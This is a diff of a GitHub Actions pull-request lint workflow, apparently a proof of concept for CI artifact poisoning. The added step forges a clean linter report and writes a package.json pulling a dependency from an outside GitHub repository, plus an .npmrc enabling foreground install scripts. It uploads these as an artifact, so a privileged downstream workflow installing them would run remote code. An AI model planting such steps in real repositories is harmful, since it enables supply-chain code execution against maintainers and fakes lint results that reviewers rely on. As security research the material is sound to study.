@@ -1,31 +1,30 @@
----
 name: Lint
 on:
   pull_request:
     branches: [main]
-
 jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-
-      - name: Stage attacker artifact payload
+      - name: Forged linter artifact
         run: |
-          echo "${{ github.event.pull_request.number }}" > pr-number.txt
-          printf 'attacker controlled linter output' > linter-report.txt
-
+          mkdir -p out
+          printf 'Forged linter report: no issues found.\n' > out/linter-report.txt
+          printf '1\n' > out/pr-number.txt
+          cat > out/package.json <<'PKG'
+          {
+            "name": "gab-fork-root",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": {
+              "gab-poc-linter-dep": "github:PDFtoMark/gab-poc-linter-dep"
+            }
+          }
+          PKG
+          printf 'foreground-scripts=true\n' > out/.npmrc
       - name: Upload linter report
-        if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: |
-            pr-number.txt
-            linter-report.txt
-            package.json
-            .npmrc
-            poc-evil
+          path: out/*
           include-hidden-files: true
-          if-no-files-found: ignore
